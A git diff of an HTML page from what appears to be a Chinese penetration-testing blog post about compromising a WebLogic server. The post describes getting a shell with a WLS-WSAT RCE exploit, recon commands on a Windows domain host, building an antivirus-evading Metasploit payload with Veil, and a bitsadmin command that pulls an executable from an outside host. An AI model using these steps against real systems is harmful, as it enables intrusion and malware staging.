@@ -122,7 +122,7 @@
 <meta property="og:image" content="/images/Weblogic引发的血案-3/11.PNG">
 <meta property="og:image" content="/images/Weblogic引发的血案-3/12.PNG">
 <meta property="og:image" content="/images/Weblogic引发的血案-3/13.PNG">
-<meta property="og:updated_time" content="2018-04-13T02:45:15.377Z">
+<meta property="og:updated_time" content="2018-04-13T02:58:55.114Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Weblogic引发的血案-3">
 <meta name="twitter:description" content="无状态">
@@ -439,7 +439,7 @@
       
 
       
-        <p>无状态<br><a id="more"></a><br>目标啊，拿来练手的。</p>
+        <p>无状态<br><a id="more"></a><br>直接用<code>WebLogic_Wls-Wsat_RCE_Exp.jar</code>exp获取到shell，和上上一篇文章一样。</p>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hostname --&gt;BX1</span><br><span class="line">systeminfo --&gt;Windows Server 2012 R2 Standard 169补丁</span><br><span class="line">ipconfig --&gt;192.168.2.23 </span><br><span class="line">whoami &amp; net localgroup administrators --&gt;得知当前用户属于管理员组，同时不确定管理员组里帐号（kxadmin）是不是域管</span><br><span class="line">tasklist --&gt;WRSA.exe Webroot杀软(一开始没注意到这线程，以为没杀软，绕了点弯路)</span><br><span class="line">所属域 --&gt;Kx</span><br></pre></td></tr></table></figure>
 <p><img src="/images/Weblogic引发的血案-3/1.PNG" alt=""></p>
 <h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>像开始说的，我是没有注意到<code>WRSA.exe</code>这款杀软，但是习惯性的用了<code>Veil生成msf的exp</code>，恰好又能过（virustotal.com）<br><img src="/images/Weblogic引发的血案-3/2.PNG" alt=""><br>利用<code>bitsadmin</code>命令将<code>exp</code>上传到目标机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://xxx.xxx.xxx/xxx.exe C:\xxx\xxx.exe</span><br></pre></td></tr></table></figure></p>
